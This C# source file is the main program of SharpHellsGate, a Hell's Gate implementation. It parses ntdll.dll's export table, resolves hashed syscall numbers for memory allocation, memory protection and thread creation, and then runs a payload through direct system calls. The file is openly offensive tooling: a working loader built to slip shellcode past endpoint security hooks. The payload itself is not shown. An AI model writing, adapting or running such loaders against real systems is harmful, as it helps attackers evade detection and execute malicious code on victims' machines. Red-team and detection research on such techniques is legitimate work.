using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;

using SharpHellsGate.Win32;

namespace SharpHellsGate {

    [StructLayout(LayoutKind.Sequential, Pack = 0)]
    public struct VxTableEntry {
        public ulong Hash;
        public byte Low;
        public byte High;
    }

    [StructLayout(LayoutKind.Sequential, Pack = 0)]
    public struct VxTable {
        public VxTableEntry NtAllocateVirtualMemory;
        public VxTableEntry NtProtectVirtualMemory;
        public VxTableEntry NtCreateThreadEx;
        public VxTableEntry NtWaitForSingleObject;
    }

    public class Program {

        static void Main(string[] args) {
            Generic.LogInfo("Copyright (C) 2020 Paul Laine (@am0nsec)");
            Generic.LogInfo("C# Implementation of the Hell's Gate VX Technique");
            Generic.LogInfo("   --------------------------------------------------\n", 0, "");

            // Only tested on x86
            if (IntPtr.Size != 8) {
                Generic.LogError("Project only tested in x64 context.\n");
                return;
            }

            // Get module
            if (!File.Exists(Environment.SystemDirectory + "\\ntdll.dll")) {
                Generic.LogError("Unable to find NTDLL module.\n");
                return;
            }
            MemoryUtil MemUtil = new MemoryUtil(File.ReadAllBytes(Environment.SystemDirectory + "\\ntdll.dll"));

            // Get DOS HEADER
            Structures.IMAGE_DOS_HEADER ImageDOSHeader = MemUtil.GetStructureFromBlob<Structures.IMAGE_DOS_HEADER>(0);
            if (ImageDOSHeader.Equals(default(Structures.IMAGE_DOS_HEADER)) || ImageDOSHeader.e_magic != Macros.IMAGE_DOS_SIGNATURE) {
                Generic.LogError("Invalid DOS Header.");
                return;
            }

            // Get NT Headers
            Structures.IMAGE_NT_HEADERS64 ImageNTHeaders = MemUtil.GetStructureFromBlob<Structures.IMAGE_NT_HEADERS64>(ImageDOSHeader.e_lfanew);
            if (ImageNTHeaders.Equals(default(Structures.IMAGE_NT_HEADERS64)) || ImageNTHeaders.Signature != Macros.IMAGE_NT_SIGNATURE) {
                Generic.LogError("Invalid NT Headers.");
                return;
            }

            // Sections
            Structures.IMAGE_SECTION_HEADER ImageSection = new Structures.IMAGE_SECTION_HEADER();
            List<Structures.IMAGE_SECTION_HEADER> ImageSectionHeaders = new List<Structures.IMAGE_SECTION_HEADER>(ImageNTHeaders.FileHeader.NumberOfSections);
            for (int cx = 0; cx < ImageNTHeaders.FileHeader.NumberOfSections; cx++) {
                long iSectionOffset = Generic.GetSectionOffset(ImageDOSHeader.e_lfanew, ImageNTHeaders.FileHeader.SizeOfOptionalHeader, cx);

                ImageSection = MemUtil.GetStructureFromBlob<Structures.IMAGE_SECTION_HEADER>(iSectionOffset);
                if (!ImageSection.Equals(default(Structures.IMAGE_SECTION_HEADER))) {
                    ImageSectionHeaders.Add(ImageSection);
                }
            }

            // Get the section in which the EAT RVA points
            UInt32 ivaImageExportTable = ImageNTHeaders.OptionalHeader.DataDirectory[0].VirtualAddress;
            long OffsetImageExportDirectory = Generic.ConvertRvaToOffset(ivaImageExportTable, ImageSectionHeaders);

            Structures.IMAGE_EXPORT_DIRECTORY ImageExportDirectory = MemUtil.GetStructureFromBlob<Structures.IMAGE_EXPORT_DIRECTORY>(OffsetImageExportDirectory);
            if (ImageExportDirectory.Equals(default(Structures.IMAGE_EXPORT_DIRECTORY))) {
                Generic.LogError("Invalid EAT.");
                return;
            }

            // Parse all functions
            long PtrToFunctionNames = Generic.ConvertRvaToOffset(ImageExportDirectory.AddressOfNames, ImageSectionHeaders);
            long PtrToFunctions = Generic.ConvertRvaToOffset(ImageExportDirectory.AddressOfFunctions, ImageSectionHeaders);

            // Load the table
            VxTable Table = new VxTable();
            Table.NtAllocateVirtualMemory.Hash = 0xf5bd373480a6b89b;
            Generic.GetVxTableEntry(ref MemUtil, ref Table.NtAllocateVirtualMemory, ref ImageSectionHeaders, PtrToFunctions, PtrToFunctionNames, ImageExportDirectory.NumberOfNames);
            Generic.LogInfo($"NtAllocateVirtualMemory: 0x{Generic.HighLowToSystemCall(Table.NtAllocateVirtualMemory):x4}");

            Table.NtCreateThreadEx.Hash = 0x64dc7db288c5015f;
            Generic.GetVxTableEntry(ref MemUtil, ref Table.NtCreateThreadEx, ref ImageSectionHeaders, PtrToFunctions, PtrToFunctionNames, ImageExportDirectory.NumberOfNames);
            Generic.LogInfo($"NtCreateThreadEx:        0x{Generic.HighLowToSystemCall(Table.NtCreateThreadEx):x4}");

            Table.NtProtectVirtualMemory.Hash = 0x858bcb1046fb6a37;
            Generic.GetVxTableEntry(ref MemUtil, ref Table.NtProtectVirtualMemory, ref ImageSectionHeaders, PtrToFunctions, PtrToFunctionNames, ImageExportDirectory.NumberOfNames);
            Generic.LogInfo($"NtProtectVirtualMemory:  0x{Generic.HighLowToSystemCall(Table.NtProtectVirtualMemory):x4}");

            Table.NtWaitForSingleObject.Hash = 0xc6a2fa174e551bcb;
            Generic.GetVxTableEntry(ref MemUtil, ref Table.NtWaitForSingleObject, ref ImageSectionHeaders, PtrToFunctions, PtrToFunctionNames, ImageExportDirectory.NumberOfNames);
            Generic.LogInfo($"NtWaitForSingleObject:   0x{Generic.HighLowToSystemCall(Table.NtWaitForSingleObject):x4}\n");

            // Execute payload
            MemUtil.Dispose();
            HellsGate gate = new HellsGate(Table);
            gate.Payload();
        }
    }
}
